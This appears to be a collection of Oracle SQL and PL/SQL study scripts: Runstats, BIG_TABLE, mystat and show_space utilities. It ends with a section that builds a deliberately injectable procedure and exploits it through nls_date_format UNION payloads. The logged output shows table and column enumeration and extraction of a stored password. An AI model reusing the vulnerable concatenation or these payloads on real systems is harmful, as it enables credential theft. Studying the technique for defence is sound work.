-- Runstat
-- Wall clock or elapsed time: This is useful to know, but not the most important piece of information.
-- System statistics: This shows, side by side, how many times each approach did something (such as a parse call, for example) and the difference between the two.
-- Latching: This is the key output of this report.

grant select on v_$statname to <>;
grant select on v_$mystat to <>;
grant select on v_$latch to <>;
grant select on v_$timer to <>;

create or replace view stats
	as select 'STAT...' || a.name name, b.value
from v$statname a, v$mystat b
	where a.statistic# = b.statistic#
union all
select 'LATCH.' || name, gets
from v$latch
union all
select 'STAT...Elapsed Time', hsecs from v$timer;

-- create table to hold statistics
create global temporary table run_stats (
	runid varchar2(15),
	name varchar2(80),
	value int )
on commit preserve rows;

-- create package runstats_pkg
-- RS_START (Runstats Start) to be called at the beginning of a Runstats test
-- RS_MIDDLE to be called in the middle, as you might have guessed
-- RS_STOP to finish off and print the report

create or replace package runstats_pkg
as
	procedure rs_start;
	procedure rs_middle;
	procedure rs_stop (p_difference_threshold in number default 0);
end;
/

create or replace package body runstats_pkg
as
	g_start number;
	g_run1 number;
	g_run2 number;

	procedure rs_start
	is
	begin
		delete from run_stats;

	    insert into run_stats
		select 'before', stats.* from stats;

		g_start := dbms_utility.get_cpu_time;
	end rs_start;

	procedure rs_middle
	is
	begin
		g_run1 := (dbms_utility.get_cpu_time - g_start);

		insert into run_stats 
		select 'after 1', stats.* from stats;

		g_start := dbms_utility.get_cpu_time;
	end rs_middle;

	procedure rs_stop (p_difference_threshold in number default 0)
	is
	begin
		g_run2 := (dbms_utility.get_cpu_time - g_start);

		dbms_output.put_line('Run1 ran in ' || g_run1 || ' cpu hsecs');
		dbms_output.put_line('Run2 ran in ' || g_run2 || ' cpu hsecs');

		if (g_run2 != 0) then
			dbms_output.put_line('run 1 ran in ' || round(g_run1/g_run2 * 100,2) || '% of the time');
		end if;

		dbms_output.put_line(chr(9));

		insert into run_stats
		select 'after 2', stats.* from stats;

		dbms_output.put_line(rpad('Name',30) || lpad('Run1',16) || lpad('Run2',16) || lpad('Diff',16));

		for x in
			(select rpad(a.name,30) ||
					to_char(b.value - a.value, '999,999,999,999') ||
					to_char(c.value - b.value, '999,999,999,999') ||
					to_char( ( (c.value - b.value) - (b.value - a.value) ),'999,999,999,999') data  
			from run_stats a, run_stats b, run_stats c
			where a.name = b.name
			and b.name = c.name
			and a.runid = 'before'
			and b.runid = 'after 1'
			and c.runid = 'after 2'
			and abs( (c.value - b.value) - (b.value - a.value) ) > p_difference_threshold
			order by abs( (c.value - b.value) - (b.value - a.value) ) )
		loop
			dbms_output.put_line(x.data);
		end loop;

		dbms_output.put_line(chr(9));
		dbms_output.put_line('Run1 latches total versus runs -- difference and pct');
		dbms_output.put_line(lpad('Run1',14) || lpad('Run2',19) || lpad('Diff',18) || lpad('Pct',11));

		for x in
			(select to_char(run1, '9,999,999,999,999') ||
					to_char(run2, '9,999,999,999,999') ||
					to_char(diff, '9,999,999,999,999') ||
					to_char(round(run1/decode(run2,0, to_number(0),run2)*100,2),'99,999.99') || '%' data
			from (select sum(b.value - a.value) run1, sum(c.value - b.value) run2,
			sum( (c.value - b.value) - (b.value - a.value) ) diff
			from run_stats a, run_stats b, run_stats c
			where a.name = b.name
			and b.name = c.name
			and a.runid = 'before'
			and b.runid = 'after 1'
			and c.runid = 'after 2'
			and a.name like 'LATCH%'))     
		loop
			dbms_output.put_line(x.data);
		end loop;
	end rs_stop;

end;
/



-- BIG_TABLE
create table big_table
as
select rownum id, OWNER, OBJECT_NAME, SUBOBJECT_NAME, OBJECT_ID,
DATA_OBJECT_ID, OBJECT_TYPE, CREATED, LAST_DDL_TIME, TIMESTAMP,
STATUS, TEMPORARY, GENERATED, SECONDARY, NAMESPACE, EDITION_NAME
from all_objects
where 1=0
/
alter table big_table nologging;

declare
	l_cnt number;
	l_rows number := &numrows;
begin
	insert /*+ append */ into big_table
	select rownum id, OWNER, OBJECT_NAME, SUBOBJECT_NAME, OBJECT_ID,
	DATA_OBJECT_ID, OBJECT_TYPE, CREATED, LAST_DDL_TIME, TIMESTAMP,
	STATUS, TEMPORARY, GENERATED, SECONDARY, NAMESPACE, EDITION_NAME
	from all_objects
	where rownum <= &numrows;
	--
	l_cnt := sql%rowcount;
	commit;
	
	while (l_cnt < l_rows)
	loop
	insert /*+ APPEND */ into big_table
	select rownum+l_cnt,OWNER, OBJECT_NAME, SUBOBJECT_NAME, OBJECT_ID,
	DATA_OBJECT_ID, OBJECT_TYPE, CREATED, LAST_DDL_TIME, TIMESTAMP,
	STATUS, TEMPORARY, GENERATED, SECONDARY, NAMESPACE, EDITION_NAME
	from big_table a
	where rownum <= l_rows-l_cnt;
	l_cnt := l_cnt + sql%rowcount;
	commit;
	end loop;
end;
/
alter table big_table add constraint big_table_pk primary key(id);
exec dbms_stats.gather_table_stats( 'THANG', 'BIG_TABLE', estimate_percent=> 1);


-- mystat.sql
set echo off
set verify off
column value new_val V
define S="&1"
set autotrace off

select a.name, b.value
from v$statname a, v$mystat b
where a.statistic# = b.statistic#
and lower(a.name) = lower('&S')
/
set echo on

-- mystat2.sql
set echo off
set verify off

select a.name, b.value V, to_char(b.value-&V,'999,999,999,999') diff
from v$statname a, v$mystat b
where a.statistic# = b.statistic#
and lower(a.name) = lower('&S')
/
set echo on

-- show_space
-- print detailed space utilization information for database segments
-- P_SEGNAME: Name of the segment—the table or index name, for example.
-- P_OWNER: Defaults to the current user, but you can use this routine to look at some other schema.
-- P_TYPE: Defaults to TABLE and represents the type of object you are looking at. For example, select distinct segment_type from dba_segments lists valid segment types.
-- P_PARTITION: Name of the partition when you show the space for a partitioned object. SHOW_SPACE shows space for only a partition at a time.
-- Unformatted Blocks: The number of blocks that are allocated to the table below the high-water mark, but have not been used. Add unformatted and unused blocks together to get a total count of blocks allocated to the table but never used to hold data in an ASSM object.
-- FS1 Blocks-FS4 Blocks: Formatted blocks with data. The ranges of numbers after their name represent the emptiness of each block. For example, (0-25) is the count of blocks that are between 0 and 25 percent empty.
-- Full Blocks: The number of blocks that are so full that they are no longer candidates for future inserts.
-- Total Blocks, Total Bytes, Total Mbytes: The total amount of space allocated to the segment measured in database blocks, bytes, and megabytes.
-- Unused Blocks, Unused Bytes: Represents a portion of the amount of space never used. These are blocks allocated to the segment, but are currently above the high-water mark of the segment.
-- Last Used Ext FileId: The file ID of the file that contains the last extent that contains data.
-- Last Used Ext BlockId: The block ID of the beginning of the last extent; the block ID within the last-used file.
-- Last Used Block: The block ID offset of the last block used in the last extent.
create or replace procedure show_space (
	p_segname in varchar2,
	p_owner in varchar2 default user,
	p_type in varchar2 default 'TABLE',
	p_partition in varchar2 default NULL )
-- this procedure uses authid current user so it can query DBA_*
-- views using privileges from a ROLE and so it can be installed
-- once per database, instead of once per user that wants to use it
authid current_user
as
	l_free_blks number;
	l_total_blocks number;
	l_total_bytes number;
	l_unused_blocks number;
	l_unused_bytes number;
	l_LastUsedExtFileId number;
	l_LastUsedExtBlockId number;
	l_LAST_USED_BLOCK number;
	l_segment_space_mgmt varchar2(255);
	l_unformatted_blocks number;
	l_unformatted_bytes number;
	l_fs1_blocks number; l_fs1_bytes number;
	l_fs2_blocks number; l_fs2_bytes number;
	l_fs3_blocks number; l_fs3_bytes number;
	l_fs4_blocks number; l_fs4_bytes number;
	l_full_blocks number; l_full_bytes number;
-- inline procedure to print out numbers nicely formatted
-- with a simple label
	procedure p( p_label in varchar2, p_num in number )
	is
	begin
		dbms_output.put_line( rpad(p_label,40,'.') || to_char(p_num,'999,999,999,999') );
	end p;
begin
-- this query is executed dynamically in order to allow this procedure
-- to be created by a user who has access to DBA_SEGMENTS/TABLESPACES
-- via a role as is customary.
-- NOTE: at runtime, the invoker MUST have access to these two
-- views!
-- this query determines if the object is an ASSM object or not
	begin
		execute immediate
		'select ts.segment_space_management
		from dba_segments seg, dba_tablespaces ts
		where seg.segment_name = :p_segname
		and (:p_partition is null or
		seg.partition_name = :p_partition)
		and seg.owner = :p_owner
		and seg.tablespace_name = ts.tablespace_name'
		into l_segment_space_mgmt
			using p_segname, p_partition, p_partition, p_owner;
	exception
	when too_many_rows then
		dbms_output.put_line( 'This must be a partitioned table, use p_partition => ');
		return;
	end;
-- if the object is in an ASSM tablespace, we must use this API
-- call to get space information, else we use the FREE_BLOCKS
-- API for the user managed segments
	if l_segment_space_mgmt = 'AUTO' then
		dbms_space.space_usage
		( p_owner, p_segname, p_type, l_unformatted_blocks,
		l_unformatted_bytes, l_fs1_blocks, l_fs1_bytes,
		l_fs2_blocks, l_fs2_bytes, l_fs3_blocks, l_fs3_bytes,
		l_fs4_blocks, l_fs4_bytes, l_full_blocks, l_full_bytes, p_partition);
		
		p( 'Unformatted Blocks ', l_unformatted_blocks );
		p( 'FS1 Blocks (0-25) ', l_fs1_blocks );
		p( 'FS2 Blocks (25-50) ', l_fs2_blocks );
		p( 'FS3 Blocks (50-75) ', l_fs3_blocks );
		p( 'FS4 Blocks (75-100)', l_fs4_blocks );
		p( 'Full Blocks ', l_full_blocks );
	else
		dbms_space.free_blocks(
		segment_owner => p_owner,
		segment_name => p_segname,
		segment_type => p_type,
		freelist_group_id => 0,
		free_blks => l_free_blks);
		
		p( 'Free Blocks', l_free_blks );
	end if;
	-- and then the unused space API call to get the rest of the
	-- information
	dbms_space.unused_space
	( segment_owner => p_owner,
	segment_name => p_segname,
	segment_type => p_type,
	partition_name => p_partition,
	total_blocks => l_total_blocks,
	total_bytes => l_total_bytes,
	unused_blocks => l_unused_blocks,
	unused_bytes => l_unused_bytes,
	LAST_USED_EXTENT_FILE_ID => l_LastUsedExtFileId,
	LAST_USED_EXTENT_BLOCK_ID => l_LastUsedExtBlockId,
	LAST_USED_BLOCK => l_LAST_USED_BLOCK );
	
	p( 'Total Blocks', l_total_blocks );
	p( 'Total Bytes', l_total_bytes );
	p( 'Total MBytes', trunc(l_total_bytes/1024/1024) );
	p( 'Unused Blocks', l_unused_blocks );
	p( 'Unused Bytes', l_unused_bytes );
	p( 'Last Used Ext FileId', l_LastUsedExtFileId );
	p( 'Last Used Ext BlockId', l_LastUsedExtBlockId );
	p( 'Last Used Block', l_LAST_USED_BLOCK );
end show_space;
/


-- %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-- sql injection
-- %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
create or replace procedure inj (p_date in date)
as
	l_username all_users.username%type;
	c sys_refcursor;
	l_query varchar2(4000);
begin
	l_query := 'select username from all_users where created = ''' ||p_date|| '''';

	dbms_output.put_line(l_query);
	open c for l_query;

	for i in 1..50 loop
		fetch c into l_username;
		exit when c%notfound;
		dbms_output.put_line(l_username || '.....');
	end loop;
	close c;
end;
/

-- injecting
alter session set nls_date_format = '"''union select tname from tab--"';

-- start twerking
SQL> exec inj(sysdate)
select username from all_users where created = ''union select tname from tab--'
BIG_TABLE.....
RUN_STATS.....
STATS.....
T.....
T1.....
T2.....
USER_PW.....

SQL>select * from thang.user_pw;
select * from thang.user_pw
                    *
ERROR at line 1:
ORA-00942: table or view does not exist

-- more injecting
alter session set nls_date_format = '"''union select tname||''/''||cname from col--"';

-- twerking
SQL> exec inj(sysdate)
select username from all_users where created = ''union select tname||'/'|| cname from col--'
USER_PW/PW.....
USER_PW/UNAME.....

-- more injecting
alter session set nls_date_format = '"''union select uname||''/''||pw from user_pw--"';

-- twerking
SQL> exec thang.inj(sysdate)
select username from all_users where created = ''union select uname||'/'||pw from user_pw--'
Thang/dadsdhwewqe.....